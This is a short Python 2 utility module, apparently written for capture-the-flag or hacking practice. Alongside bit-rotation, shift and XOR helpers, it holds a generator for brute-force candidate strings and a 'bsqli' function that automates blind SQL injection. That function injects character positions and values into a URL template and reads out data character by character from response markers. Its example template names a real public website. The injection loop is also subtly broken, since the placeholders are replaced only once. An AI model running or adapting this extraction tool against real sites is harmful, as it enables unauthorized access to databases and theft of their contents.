import itertools
import urllib2

def go(url,post='',cookie='',method='GET'):
    r=urllib2.Request(url,post)
    r.get_method = lambda: method
    if cookie is not '':
        r.add_header('cookie',cookie)
    a=urllib2.urlopen(r)
    return a.read()

def make_bruteforce_char_set(charset, maxlength):
    '''
for x in make_bruteforce_char_set('abcde',5):print x
'''
    return (''.join(candidate)
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
        for i in range(1, maxlength + 1)))

def ror(x,y,bit=32):
    bits=(2**bit)-1
    x=bin(x & bits)[2:].zfill(bit)
    start=x[:-y]
    end=x[-y:]
    return eval('0b'+end+start)

def rol(x,y,bit=32):
    bits=(2**bit)-1
    x=bin(x & bits)[2:].zfill(bit)
    start=x[:y]
    end=x[y:]
    return eval('0b'+end+start)

def shr(x,y):
    return x>>y

def shl(x,y,bit=32):
    return (x<<y)&(2**bit-1)

def shrd(x,y,z,bit=32):
    x=x>>z
    y=y&(2**z-1)
    x=x+y*2**(bit-z)
    return x

def xor(s,key):
    r=''
    for x in range(len(s)):
        r+=chr(ord(s[x])^ord(key[x%len(key)]))
    return r
    pass

def sar():
    pass

def bsqli(url,ch,cookie='',post='',strnum_max=20,method=''):
    an=''
    '''bsqli('www.naver.com/?q=%strnum%&test=%strv%'''
    for x in range(1,strnum_max+1):
        for y in range(0x80,0x19,-1):
            sx=str(x)
            sy=str(y)
            print sx,sy,chr(y)
            url=url.replace('%strnum%',sx)
            url=url.replace('%strv%',sy)
            print url
            r=go(url,post,cookie,method)
            if r.find(ch)>0:
                an+=chr(y)
                print 'an:',an
                break
            else:
                pass
